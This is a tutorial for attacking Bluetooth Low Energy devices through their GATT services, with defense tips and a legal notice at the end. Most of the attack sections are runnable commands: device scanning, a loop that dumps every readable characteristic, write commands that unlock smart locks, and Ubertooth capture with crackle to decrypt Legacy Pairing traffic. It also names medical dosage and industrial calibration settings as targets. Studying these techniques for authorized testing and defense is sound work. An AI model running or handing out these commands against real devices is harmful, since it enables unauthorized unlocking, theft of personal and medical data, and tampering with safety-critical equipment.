# BLE GATT Service Attack Guide

This guide covers the methodology for attacking Bluetooth Low Energy (BLE) devices through their GATT (Generic Attribute Profile) services. BLE is the dominant protocol for IoT devices, wearables, medical devices, smart locks, and industrial sensors, making GATT service attacks one of the highest-value wireless attack vectors.

## Introduction and Objectives

BLE GATT attacks target the data layer of BLE devices, exploiting weak or absent authentication on the characteristics that control device behavior and store sensitive information. This guide provides a complete attack methodology from device discovery through encryption cracking, with detailed coverage of characteristic read/write exploitation.

**Learning objectives**:

- Discover and enumerate BLE devices in the target area
- Enumerate GATT services and characteristics systematically
- Exploit readable characteristics to extract sensitive data (credentials, tokens, personal information)
- Exploit writable characteristics to control device behavior without authorization
- Crack BLE Legacy Pairing encryption using crackle with captured pairing exchanges
- Identify common BLE vulnerability patterns in IoT devices

**Prerequisites**: A BLE adapter (built-in or USB dongle). Target BLE device(s) within range. For encryption cracking: Ubertooth One or similar BLE sniffer hardware. Understanding of BLE protocol basics (advertising, connections, GATT hierarchy).

---

## Overview

BLE uses a client-server model built on GATT, where devices expose structured data as **services** containing **characteristics**. Each characteristic has properties (read, write, notify, indicate) and a value. The GATT layer is where most BLE vulnerabilities exist because many device manufacturers expose sensitive characteristics without proper authentication or authorization.

BLE pairing methods determine the security level of the connection:
- **Just Works**: No MITM protection, temporary key is all zeros -- trivially sniffable
- **Passkey Entry**: 6-digit passkey displayed on one device, entered on another -- vulnerable to eavesdropping
- **Out-of-Band (OOB)**: Uses a separate channel (NFC, QR code) for key exchange -- most secure
- **Numeric Comparison**: Both devices display a number, user confirms match -- most secure for BLE 4.2+

The critical insight for BLE attacks: devices using Legacy Pairing with Just Works generate a Temporary Key of 0x0000000000000000, making the entire pairing exchange recoverable from a captured packet stream.

---

## Phase 1: BLE Device Discovery

BLE devices advertise their presence through advertisement packets broadcast on three dedicated channels (37, 38, 39). These advertisements contain the device address, local name, service UUIDs, transmit power level, and manufacturer-specific data.

```bash
# Standard BLE scan
sudo hcitool lescan

# Scan without filtering duplicates (see every advertisement)
sudo hcitool lescan --duplicates

# Structured scan with blescan (BlueZ Python tool)
blescan -i hci0 -t 30 -o ble_devices.json

# Interactive discovery with bluetoothctl
bluetoothctl
# > power on
# > scan on
# > devices
# > scan off
```

During discovery, note these key attributes:
- **Address type**: Public (fixed, traceable) vs Random (privacy-enabled, changes periodically)
- **Advertising flags**: Discoverable, connectable, BR/EDR support
- **Service UUIDs**: Advertised services indicate device type (e.g., 0x1809 = Heart Rate, 0x180F = Battery, custom UUIDs for proprietary services)
- **RSSI**: Signal strength for physical proximity estimation
- **Manufacturer data**: Often contains device model, firmware version, or telemetry

Bluehydra provides continuous BLE monitoring with device tracking across sessions:

```bash
sudo bluehydra -i hci0 --ble -d /opt/bh_data
```

---

## Phase 2: GATT Service Enumeration

Once a target device is identified, connect and enumerate its GATT services. The `gatttool` utility is the primary tool for manual GATT exploration:

```bash
# List all primary services
gatttool -b XX:XX:XX:XX:XX:XX --primary

# Output example:
# attr handle = 0x0001, end grp handle = 0x0005 uuid: 00001800-0000-1000-8000-00805f9b34fb (Generic Access)
# attr handle = 0x0006, end grp handle = 0x0009 uuid: 00001801-0000-1000-8000-00805f9b34fb (Generic Attribute)
# attr handle = 0x000a, end grp handle = 0x0012 uuid: 0000fe9f-0000-1000-8000-00805f9b34fb (Custom Service)

# List all characteristics with their properties
gatttool -b XX:XX:XX:XX:XX:XX --characteristics

# Output example:
# handle = 0x0002, char properties = 0x02, char value handle = 0x0003, uuid = 00002a00 (Device Name)
# handle = 0x000b, char properties = 0x0a, char value handle = 0x000c, uuid = 00002a19 (Battery Level)
# handle = 0x000f, char properties = 0x1c, char value handle = 0x0010, uuid = 0000fe9f (Custom Write)
```

Characteristic properties are bitmask flags:
- `0x02` = Read
- `0x04` = Write Without Response
- `0x08` = Write With Response
- `0x10` = Notify
- `0x20` = Indicate

The combination of Read + Write (0x0A) on a custom characteristic is a high-value target -- it often controls device behavior (lock/unlock, motor control, configuration).

For systematic enumeration, use an interactive session:

```bash
gatttool -b XX:XX:XX:XX:XX:XX -I
[XX:XX:XX:XX:XX:XX][LE]> connect
[XX:XX:XX:XX:XX:XX][LE]> primary
[XX:XX:XX:XX:XX:XX][LE]> characteristics
[XX:XX:XX:XX:XX:XX][LE]> char-desc
```

---

## Phase 3: Characteristic Read/Write Exploitation

The core BLE attack involves reading sensitive data from characteristics and writing control commands to characteristics that lack proper authorization.

### Reading Sensitive Data

```bash
# Read device name
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a00-0000-1000-8000-00805f9b34fb

# Read battery level
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a19-0000-1000-8000-00805f9b34fb

# Read custom characteristic (potentially sensitive data)
gatttool -b XX:XX:XX:XX:XX:XX --char-read -a 0x0010

# Dump all readable characteristics systematically
for handle in $(seq 1 255); do
  h=$(printf '0x%04x' $handle)
  result=$(gatttool -b XX:XX:XX:XX:XX:XX --char-read -a "$h" 2>/dev/null)
  [ $? -eq 0 ] && echo "Handle $h: $result"
done
```

Common sensitive data found in readable characteristics:
- Authentication tokens and session keys
- Device firmware version and hardware revision
- User profile data (name, age, weight on fitness devices)
- GPS coordinates and location history
- Heart rate, blood glucose, and other medical data
- Configuration parameters and Wi-Fi credentials (on IoT gateways)
- Lock state and access logs (on smart locks)

### Writing Control Commands

```bash
# Write to unlock characteristic (common on smart locks)
gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a 0x0025 -n 0100

# Write to configuration characteristic
gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a 0x0018 -n 0001FF

# Write without response (fire and forget, no acknowledgement)
gatttool -b XX:XX:XX:XX:XX:XX --char-write-cmd -a 0x0025 -n 0001

# Interactive multi-step exploitation
gatttool -b XX:XX:XX:XX:XX:XX -I << 'CMDS'
connect
primary
char-read-hnd 0x0025
char-write-req 0x0025 0100
char-read-hnd 0x0025
quit
CMDS
```

Common write attack vectors:
- **Smart locks**: Writing 0x01/0x00 to lock/unlock characteristic
- **LED controllers**: Writing RGB values to color characteristic
- **Thermostats**: Writing temperature setpoints without authorization
- **Medical devices**: Writing dosage or alert configuration
- **Industrial sensors**: Writing calibration data or threshold values

---

## Phase 4: BLE Encryption Cracking with crackle

When a BLE device uses Legacy Pairing (Just Works or Passkey Entry), the Temporary Key (TK) is either all zeros (Just Works) or a 6-digit number (Passkey). crackle exploits this weak key derivation to decrypt captured BLE traffic.

### Capturing the Pairing Exchange

```bash
# Start BLE promiscuous capture with Ubertooth
ubertooth-btle -f -c /tmp/ble_capture.pcap

# Follow a specific device connection
ubertooth-btle -t XX:XX:XX:XX:XX:XX -c /tmp/ble_target.pcap

# Capture with access address for established connections
ubertooth-btle -a 0x8E89BED6 -c /tmp/ble_conn.pcap
```

The pairing exchange must be captured from the beginning -- crackle needs the LL_ENC_REQ and LL_ENC_RSP packets that contain the Random and EDIV values used to derive the session key.

### Cracking the Encryption

```bash
# Standard crack attempt
crackle -i /tmp/ble_capture.pcap -o /tmp/ble_decrypted.pcap

# With known Temporary Key (all zeros for Just Works)
crackle -i /tmp/ble_capture.pcap -o /tmp/ble_decrypted.pcap -t 0000000000000000

# Analyze decrypted traffic
wireshark /tmp/ble_decrypted.pcap &
```

Crackle output will show:
```
Temporary Key: 0000000000000000 (Just Works)
Short Term Key: XXXXXXXXXXXXXXXX
Decrypted 42 packets successfully
```

Once decrypted, all GATT read/write operations are visible in plaintext, revealing any credentials, commands, or sensitive data exchanged during the session.

---

## Common BLE Vulnerabilities in IoT Devices

1. **No authentication on GATT operations**: Many devices allow unauthenticated connections to read and write any characteristic. No bonding or pairing required.

2. **Hardcoded encryption keys**: Some devices use static passkeys or pre-shared keys that are identical across all units of the same model.

3. **Writable firmware characteristics**: Devices that allow OTA firmware updates via an unauthenticated GATT write characteristic can be reflashed with malicious firmware.

4. **Notifications leaking data**: Characteristics with Notify property may broadcast sensitive data to any connected client without authentication.

5. **No connection whitelisting**: Devices that accept connections from any BLE client without bonding are vulnerable to unauthorized access from any attacker within range.

6. **Plaintext credential storage**: Devices that store WiFi passwords or API tokens in GATT characteristics readable by any connected client.

7. **Reconnection spoofing (BLESA)**: After a device disconnects, an attacker can spoof the legitimate client's address and reconnect, inheriting the previous session's permissions without re-authentication.

---

## Defense Recommendations

- Use **LE Secure Connections** (BLE 4.2+) with Numeric Comparison or OOB pairing instead of Legacy Pairing
- Implement **bonding** to ensure only previously authenticated devices can connect
- Apply **authorization checks** on all sensitive GATT characteristics, not just authentication
- Disable **write access** on critical characteristics (firmware update, lock control) without authenticated bond
- Use **encrypted characteristic values** for sensitive data even when the link is encrypted (defense in depth)
- Implement **connection parameter limits** to prevent rapid reconnection exploits
- Disable **unencrypted advertisement data** containing sensitive device information

---

> **Legal Notice**: Only connect to and enumerate BLE devices you own or have explicit authorization to test. Unauthorized access to BLE devices, even for "just reading" characteristics, may violate computer fraud and abuse laws.

## Hands-on Exercise: BLE GATT Attack

Practice the complete BLE GATT attack methodology against test devices:

**Setup**:

```bash
# Ensure BLE adapter is available and powered on
sudo hciconfig hci0 up
# Have at least one BLE device available for testing (smart lock, fitness tracker, etc.)
```

**Exercise steps**:

1. Scan for BLE devices using hcitool lescan and record all discovered devices with address type and RSSI
2. Select a target device and enumerate all GATT services with gatttool --primary
3. List all characteristics with their properties and identify high-value targets (custom services, Read+Write characteristics)
4. Read all readable characteristics systematically using the handle enumeration loop
5. Identify characteristics that control device behavior and attempt unauthorized writes
6. If the device uses Legacy Pairing, capture a pairing exchange with Ubertooth and attempt crackle decryption
7. Document all findings including unauthorized data access and unauthorized control actions
8. Provide defense recommendations specific to the vulnerabilities discovered

**Validation criteria**: Successfully enumerate all GATT services and characteristics. Extract sensitive data from at least two readable characteristics. Demonstrate unauthorized device control through characteristic writes. If Legacy Pairing is in use, decrypt captured traffic with crackle.

## References and Resources

- [Bluetooth SIG - GATT Specification](https://www.bluetooth.com/specifications/gatt/)
- [crackle GitHub Repository](https://github.com/mikeryan/crackle)
- [Ubertooth Documentation](https://github.com/greatscottgadgets/ubertooth)
- [OWASP IoT Security Guide](https://owasp.org/www-project-internet-of-things/)
- [NIST SP 800-121 - Bluetooth Security Guide](https://csrc.nist.gov/publications/detail/sp/800-121/rev-1/final)
